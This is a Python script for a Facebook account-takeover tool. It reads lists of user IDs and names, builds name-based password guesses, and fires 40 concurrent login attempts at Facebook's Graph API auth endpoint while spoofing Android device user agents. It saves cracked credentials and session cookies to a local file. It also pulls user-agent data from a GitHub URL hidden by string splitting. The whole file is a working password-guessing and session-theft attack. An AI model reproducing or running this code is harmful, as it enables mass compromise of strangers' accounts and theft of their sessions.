import os, sys, uuid, re, random, time, string, json, base64
from io import BytesIO

try:

    os.system(
        'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
    import requests, rich, certifi, pycurl
except:
    os.system("git pull")

    os.system("pip3 install requests rich certifi pycurl")

    import requests, rich, certifi, pycurl

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version = "  v1"

ua = []

def live_update():
    try:
        url = "https://raw" + ".github" + "user" + "cont" + "ent.co" + "m/T" + "EAM-" + "ELIT" + "E1/da" + "tab" + "ase/m" + "ain/" + "X" + "YA" + ".txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax = buffer.getvalue().decode('utf-8').splitlines()[0]
        for u in datax.split("|"):
            ua.append(u)
    except:

        sys.exit("[!!] Internet Error...")
live_update()
def Samsung():
    Anderson = random.choice(
        ["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5", "4.4.2", "5.1.1",
         "6.0.1", "9.0.1"])
    model = random.choice(
        ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
         "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F",
         "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android " + Anderson + "; " + model + " Build/LRX22C) [FBAN/" + FBAN + ";FBAV/" + cho + ".0.0.15.89;FBPN/" + platform + ";FBLC/sv_SE;FBBV/" + vir + ";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/" + model + ";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=" + str(
        random.choice(range(1, 4))) + ".0,width=" + str(random.choice(range(720, 1500))) + ",height=" + str(
        random.choice(range(1500, 2000))) + "};FB_FW/1;]"
    return ua


class sort:
    def line():
        return "[b dark_sea_green2]━" * 37

    def clear():
        os.system("clear")

    def logo():
        aci = f'''    //   ) )                                      
   //___/ /  __     ( )   __      ___      ___    
  / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
 //       //      / / //   / / //       //        
//       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Free[/r]\n{sort.line()}'''
        print(aci)

    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx


def dd(fbbd, device):
    if fbbd.lower() == "samsung":
        return random.choice(
            ["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F", "SM-A326B", "SM-A125F",
             "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN", "SM-A205GN", "SM-A505GN", "SM-G930F",
             "SM-J210F", "SM-N9005", "SM-J210F"])
    elif fbbd.lower() == "vivo":
        return random.choice(["vivo 1935", "V3Max"])
    elif fbbd.lower() == "motorola":
        return random.choice(
            ['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G',
             'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s',
             'Moto G5s Plus', 'Moto G6', 'Moto X', 'moto g power (2021)'])
    elif fbbd.lower() == "oppo":
        return random.choice(["CPH" + str(random.choice(range(1000, 2000))), "oppo r7sm"])
    elif fbbd.lower() == "oneplus":
        return random.choice(["A0001", "OnePlus 11R", "OnePlus 10T", "OnePlus Nord 3 5G"])
    elif fbbd.lower() == "google":
        return random.choice(["Pixel 6a", "Pixel 3"])
    elif fbbd.lower() == "asus":
        return random.choice(["ASUS_X01BDA", "ASUS_Z01QD", "ASUS_I005DC", "NX55", "MXB48T"])
    elif fbbd.lower() == "huawei":
        return random.choice(
            ["DUB-LX1", "AGS2-L09", "POT-LX1", "DRA-LX2", "POT-LX3", "VOG-L29", "EVR-N29", "FIG-LX1", "Kirin Treble",
             "HUAWEI LUA-L21", "ATU-L31", "COL-L29", "NAM-LX9", "VOG-L29", "JKM-LX1", "RNE-L22"])
    elif fbbd.lower() == "lenovo":
        return random.choice(
            ["Lenovo TB-X505F", "Lenovo A6020a46", 'PAFR0026IN', 'PAFR0026', 'PAFR0033IN', 'PAFR0033', 'PAFR0013IN',
             'PAFR0013', 'PAGW0015IN', 'L39051', 'XT2091-8'])
    elif fbbd.lower() == "sony":
        return random.choice(
            ["C2105", "C2104", "G3312", "G3311", "G3313", "LT29i", "D6503", "D6502", "SO-03F", "Xperia Z2", "D6503",
             "D6502", "SO-03F", "Xperia Z2", "D6563", "D6603", "D6653", "D6616", "D6643", "SO-01G", "SOL26", "D6646",
             "D5803", "D5833", "SO-02G", "D6633", "D6603", "D6643", "D6653", "D6616", "D6683", "SGP621", "SGP611",
             "E6533", "D6708"])
    elif fbbd.lower() == "tecno":
        return random.choice(["CG8", "CG8h", "LB8", "LB8a", "CH7n", "CH7", "LH6n"])
    else:
        return device


def filee():
    global oks, loop
    pwx = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][B] [spring_green1]BD/IND FILE Clone")
    print(sort.line())
    print("[b] Π[chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] "
          "/sdcard/id.txt")
    path = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(sort.line())
    try:
        fl = open(path, "r").read().splitlines()
    except:
        filee()
    limit = int(input("   Password Limit -> "))
    print(sort.line())
    for i in range(limit):
        print(
            " [b] Π[chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
        passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
        if passw not in pwx:
            pwx.append(passw)
        print(sort.line())
    print("  [r dark_olive_green1]Π1[/r dark_olive_green1][b violet] Method 1")
    print("  [r dark_olive_green1]Π2[/r dark_olive_green1][b violet] Method 2")
    print("  [r dark_olive_green1]Π3[/r dark_olive_green1][b violet] Method 3")
    print("  [r dark_olive_green1]Π4[/r dark_olive_green1][b violet] Method 4")
    print("  [r dark_olive_green1]Π5[/r dark_olive_green1][b violet] Method 5")
    print("  [r dark_olive_green1]Π6[/r dark_olive_green1][b violet] Method 6")
    print("  [r dark_olive_green1]Π7[/r dark_olive_green1][b violet] Method 7")
    print("  [r dark_olive_green1]Π8[/r dark_olive_green1][b violet] Method 8")
    print(sort.line())
    meth = str(input(" \x1b[38;1;198m Π  \x1b[38;5;155mCHOICE      \x1b[38;5;197m⟨ \x1b[1;97m  "))
    with ThreadPool(max_workers=40) as prince:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(fl)))
        print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
        print(sort.line())
        for xd in fl:
            uid = xd.split("|")[0]
            name = xd.split("|")[1]
            prince.submit(file_sub, uid, pwx, name, meth, fl)
useragent = Samsung()

def file_sub(uid, pwx, name, meth, fl):
    global oks, loop
    if meth in ["a", "A", "1"]:
        uax = ua[0]
    elif meth in ["b", "B", "2"]:
        uax = ua[1]
    elif meth in ["c", "C", "3"]:
        uax = ua[2]
    elif meth in ["d", "D", "4"]:
        uax = ua[3]
    elif meth in ["e", "E", "5"]:
        uax = ua[4]
    elif meth in ["f", "F", "6"]:
        uax = ua[5]
    elif meth in ["g", "G", "7"]:
        uax = ua[6]
    else:
        uax = ua[7]
    sys.stdout.write(
        f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(fl))}  • {str(len(oks))}"),
    sys.stdout.flush()
    First = name.split(" ")[0]
    try:
        Last = name.split(" ")[1]
    except:
        Last = "khan"
    for pw in pwx:
        ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
            "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
                                                                                      First.upper()).replace("LAST",
                                                                                                             Last.upper())

        # try:
        #     rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
        #     device = uax.split("FBDV/")[1].split(";")[0]
        #     plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
        #                           "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
        #     fban = uax.split("FBAN/")[1].split(";")[0]
        #     fbpn = uax.split("FBPN/")[1].split(";")[0]
        #     fbav = uax.split("FBAV/")[1].split(";")[0]
        #     fbbd = uax.split("FBBD/")[1].split(";")[0]
        #     model = dd(fbbd, device)
        #     fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
        #         random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
        #     androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
        #         random.choice(["2", "1", "0"]))
        #     nowandroidv = uax.split("Android ")[1].split(";")[0]
        #     useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
        #         nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
        #         fbav, fbverson).replace(device, model)
        # except:
        #     useragent = uax
        #     model = uax.split("FBDV/")[1].split(";")[0]
        token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        adi = str(uuid.uuid4())
        data = {
            "adid": adi,
            "format": "json",
            "device_id": adi,
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": token,
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
        head = {
            'User-Agent': useragent,
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'Connection': 'close',
            'cache-control': 'no-cache',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'WIFI',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': str(random.randint(2000, 4000)),
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
        url = 'https://graph.facebook.com/auth/login'
        rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
        if "session_key" in rq:
            coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
            print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}|{coki}\n")
            open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
            oks.append(uid)

            break
        elif "Please Confirm Email" in str(rq):

            print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
            open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
            oks.append(uid)

            break

        else:
            continue
    loop += 1


filee()
